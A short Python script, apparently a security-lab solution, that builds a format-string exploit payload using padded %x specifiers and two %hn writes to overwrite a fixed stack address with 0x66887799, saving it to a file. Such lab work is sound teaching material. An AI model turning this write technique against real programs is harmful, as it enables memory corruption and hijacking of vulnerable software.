#!/usr/bin/python3
# task1_1: change the value of the target address to 0x66887799

# target address
addr = 0xffffcf68
# 1: modify the high 2 bytes
payload = (addr+2).to_bytes(4,byteorder='little')
payload += ("abcd").encode('latin-1')
# 2: modify the low 2 bytes
payload += (addr).to_bytes(4,byteorder='little')
# new value
new_val = 0x66887799

# 3: calculate the length of the first write
# 0x6688 - 4 * 3 - 5*8 = 26196
len1 = 0x6688 - 4 * 3 - 5*8
# 4: calculate the length of the second write
# 0x7799 - 0x6688 = 4369
len2 = 0x7799 - 0x6688

# 5+1 = 6
# 7th is the address of the high 2 bytes
# 9th is the address of the low 2 bytes
payload += ("%.8x"*5 + "%.{}x".format(len1) + "%hn" + "%.{}x".format(len2) + "%hn").encode('latin-1')


with open('input', 'wb') as f:
  f.write(payload)